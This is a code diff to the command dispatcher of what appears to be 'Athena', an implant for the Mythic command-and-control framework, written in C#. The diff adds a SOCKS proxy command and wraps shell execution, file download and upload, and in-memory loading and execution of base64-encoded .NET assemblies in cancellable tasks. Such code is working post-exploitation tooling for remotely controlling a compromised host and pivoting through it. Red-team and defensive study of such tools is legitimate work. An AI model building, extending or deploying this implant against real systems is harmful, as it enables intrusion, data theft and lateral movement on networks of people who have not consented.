@@ -4,9 +4,9 @@ using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
 using System.Collections.Generic;
+using System.Linq;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Linq;
 
 namespace Athena.Commands
 {
@@ -19,19 +19,11 @@ namespace Athena.Commands
             //job.started = true;
             switch (job.task.command)
             {
-                case "builtin":
-                    checkAndRunPlugin(job);
-                    break;
                 case "download":
-                    var downloadTask = Task.Run(() =>
-                    {
-                        MythicDownloadJob j = new MythicDownloadJob(job);
-                        Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
-                        j.path = par["file"];
-
-                        FileHandler.downloadFile(j);
-
-                    });
+                    MythicDownloadJob j = new MythicDownloadJob(job);
+                    Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
+                    j.path = par["file"];
+                    FileHandler.downloadFile(j);
                     break;
                 case "execute-assembly":
                     if (Globals.executeAssemblyTask != "")
@@ -59,38 +51,42 @@ namespace Athena.Commands
                                     //Set output for our ConsoleWriter
                                     Console.SetOut(consoleWriter);
                                     //Start a new thread for our blocking Execute-Assembly
-                                    Globals.executeAseemblyThread = new Thread(() =>
+                                    try
                                     {
-                                        try
-                                        {
-                                            job.hasoutput = true;
-                                            AssemblyHandler.ExecuteAssembly(Misc.Base64DecodeToByteArray(ea.assembly), ea.arguments);
-                                            //Assembly finished executing.
-                                            Globals.executeAssemblyTask = "";
-                                            job.complete = true;
-                                            Console.SetOut(origStdout);
-                                            return;
-                                        }
-                                        catch (Exception)
-                                        {
-                                            //Cancellation was requested, clean up.
-                                            Globals.executeAssemblyTask = "";
-                                            job.hasoutput = true;
-                                            job.complete = true;
-                                            job.errored = true;
-                                            Console.SetOut(origStdout);
-                                            Globals.alc.Unload();
-                                            Globals.alc = new ExecuteAssemblyContext();
-                                            return;
-                                        }
-                                    });
-                                    
-                                    Globals.executeAseemblyThread.IsBackground = true;
-                                    
-                                    //Start our assembly.
-                                    Globals.executeAseemblyThread.Start();
+                                        job.hasoutput = true;
+                                        AssemblyHandler.ExecuteAssembly(Misc.Base64DecodeToByteArray(ea.assembly), ea.arguments);
+                                        //Assembly finished executing.
+                                        Globals.executeAssemblyTask = "";
+                                        job.complete = true;
+                                        Console.SetOut(origStdout);
+                                        return;
+                                    }
+                                    catch (Exception)
+                                    {
+                                        //Cancellation was requested, clean up.
+                                        Globals.executeAssemblyTask = "";
+                                        job.hasoutput = true;
+                                        job.complete = true;
+                                        job.errored = true;
+                                        Console.SetOut(origStdout);
+                                        Globals.alc.Unload();
+                                        Globals.alc = new ExecuteAssemblyContext();
+                                        return;
+                                    }
+
+
+
+                                    //Globals.executeAseemblyThread = new Thread(() =>
+                                    //{
+
+                                    //});
+
+                                    //Globals.executeAseemblyThread.IsBackground = true;
+
+                                    ////Start our assembly.
+                                    //Globals.executeAseemblyThread.Start();
                                 }
-                                catch(Exception e)
+                                catch (Exception e)
                                 {
                                     Globals.executeAssemblyTask = "";
                                     job.complete = true;
@@ -128,7 +124,7 @@ namespace Athena.Commands
                         job.hasoutput = true;
                         job.complete = true;
                         job.taskresult = output;
-                    });
+                    }, job.cancellationtokensource.Token);
                     break;
                 case "jobkill":
                     Task.Run(() =>
@@ -169,36 +165,48 @@ namespace Athena.Commands
                             job.complete = true;
                             job.hasoutput = true;
                         }
-                    });
+                    }, job.cancellationtokensource.Token);
                     break;
                 case "load":
-                    LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
-                    job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.name);
-                    job.complete = true;
-                    job.hasoutput = true;
+                    Task.Run(() =>
+                    {
+                        LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
+                        job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.name);
+                        job.complete = true;
+                        job.hasoutput = true;
+                    }, job.cancellationtokensource.Token);
                     break;
                 //Can these all be merged into one and handled on the server-side?
                 case "load-assembly":
-                    try
-                    {
-                        LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
-                        job.taskresult = AssemblyHandler.LoadAssembly(Misc.Base64DecodeToByteArray(la.assembly));
-                    }
-                    catch(Exception e)
-                    {
-                        job.taskresult = e.Message;
-                        job.errored = true;
-                    }
-                    job.hasoutput = true;
-                    job.complete = true;
+                    Task.Run(() => {
+                        try
+                        {
+                            LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
+                            job.taskresult = AssemblyHandler.LoadAssembly(Misc.Base64DecodeToByteArray(la.assembly));
+                        }
+                        catch (Exception e)
+                        {
+                            job.taskresult = e.Message;
+                            job.errored = true;
+                        }
+                        job.hasoutput = true;
+                        job.complete = true;
+                    }, job.cancellationtokensource.Token);
                     break;
                 case "reset-assembly-context":
-                    job.taskresult = AssemblyHandler.ClearAssemblyLoadContext();
-                    job.complete = true;
-                    job.hasoutput = true;
+                    Task.Run(() =>
+                    {
+                        job.taskresult = AssemblyHandler.ClearAssemblyLoadContext();
+                        job.complete = true;
+                        job.hasoutput = true;
+
+                    }, job.cancellationtokensource.Token);
                     break;
                 case "shell":
-                    Execution.ShellExec(job);
+                    Task.Run(() =>
+                    {
+                        Execution.ShellExec(job);
+                    }, job.cancellationtokensource.Token);
                     break;
                 case "sleep":
                     var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
@@ -233,30 +241,83 @@ namespace Athena.Commands
                     job.complete = true;
                     job.hasoutput = true;
                     break;
-                case "stop-assembly":
-                    //Will need to make this work
-                    if(Globals.executeAseemblyThread != null)
+                case "socks":
+                    var socksInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
+                    if (socksInfo["action"].ToString() =="start")
                     {
-                        Globals.executeAseemblyThread.Interrupt();
-                        //Globals.executeAseemblyThread.Abort();
-                        Thread.Sleep(3000);
-                        if (Globals.executeAseemblyThread.IsAlive)
+                        if (Globals.socksHandler == null)
                         {
-                            //Globals.executeAseemblyThread.Suspend();
+                            Globals.socksHandler = new SocksHandler();
+                            Globals.socksHandler.Start();
                         }
-
-                        job.complete = true;
-                        job.taskresult = "Cancellation Requested.";
-                        job.hasoutput = true;
-                        Globals.executeAssemblyTask = "";
-                        Globals.alc.Unload();
+                        else
+                        {
+                            if (Globals.socksHandler.running)
+                            {
+                                job.taskresult = "SocksHandler is already running.";
+                            }
+                            else
+                            {
+                                Globals.socksHandler.Start();
+                                job.taskresult = "Socks Started.";
+                            }
+                        }
                     }
                     else
                     {
-                        job.complete = true;
-                        job.taskresult = "No execute-assembly task currently running.";
-                        job.hasoutput = true;
+                        try
+                        {
+                            job.taskresult = "Stopped";
+                            if (Globals.socksHandler != null)
+                            {
+                                Globals.socksHandler.Stop();
+                            }
+                            else
+                            {
+                                job.taskresult = "Socks is not running";
+                                job.errored = true;
+                                job.complete = true;
+                            }
+                        }
+                        catch
+                        {
+                            job.taskresult = "Socks is not running";
+                            job.errored = true;
+                            job.complete = true;
+                        }
                     }
+                    //SOCKS5 – A .NET CORE IMPLEMENTATION FROM SCRATCH
+                    //https://blog.zhaytam.com/2019/11/15/socks5-a-net-core-implementation-from-scratch/
+                    //https://gist.github.com/zHaytam/3730d512eb5eaf37fb3bd3d176185541
+                    job.complete = true;
+                    job.hasoutput = true;
+                    break;
+                case "stop-assembly":
+                    var stopAssemblyTask = Task.Run(() => {
+                        //Will need to make this work
+                        if (Globals.executeAseemblyThread != null)
+                        {
+                            Globals.executeAseemblyThread.Interrupt();
+                            //Globals.executeAseemblyThread.Abort();
+                            Thread.Sleep(3000);
+                            if (Globals.executeAseemblyThread.IsAlive)
+                            {
+                                //Globals.executeAseemblyThread.Suspend();
+                            }
+
+                            job.complete = true;
+                            job.taskresult = "Cancellation Requested.";
+                            job.hasoutput = true;
+                            Globals.executeAssemblyTask = "";
+                            Globals.alc.Unload();
+                        }
+                        else
+                        {
+                            job.complete = true;
+                            job.taskresult = "No execute-assembly task currently running.";
+                            job.hasoutput = true;
+                        }
+                    }, job.cancellationtokensource.Token);
                     break;
                 case "upload":
                     //This doesn't task from mythic for some reason
@@ -285,6 +346,13 @@ namespace Athena.Commands
 
                                 while(uj.chunk_num != uj.total_chunks+1)
                                 {
+                                    if (job.cancellationtokensource.IsCancellationRequested)
+                                    {
+                                        job.complete = true;
+                                        job.taskresult = "Task cancelled by user.";
+                                        job.hasoutput = true;
+                                        uj.complete = true;
+                                    }
                                     if (!uj.locked && uj.chunkUploads.Count() > 0)
                                     {
                                         try
@@ -300,6 +368,7 @@ namespace Athena.Commands
                                         catch (Exception e)
                                         {
                                             job.complete = true;
+                                            job.errored = true;
                                             job.taskresult = e.Message;
                                             job.hasoutput = true;
                                             uj.complete = true;
@@ -321,10 +390,13 @@ namespace Athena.Commands
                             job.errored = true;
                         }
 
-                    });
+                    }, job.cancellationtokensource.Token);
                     break;
                 default:
-                    checkAndRunPlugin(job);
+                    var defaultTask = Task.Run(() =>
+                    {
+                        checkAndRunPlugin(job);
+                    }, job.cancellationtokensource.Token);
                     break;
             }
         }
@@ -342,7 +414,6 @@ namespace Athena.Commands
                 //Fail silently
             }
         }
-
         static void checkAndRunPlugin(MythicJob job)
         {
             if (Globals.loadedcommands.ContainsKey(job.task.command))
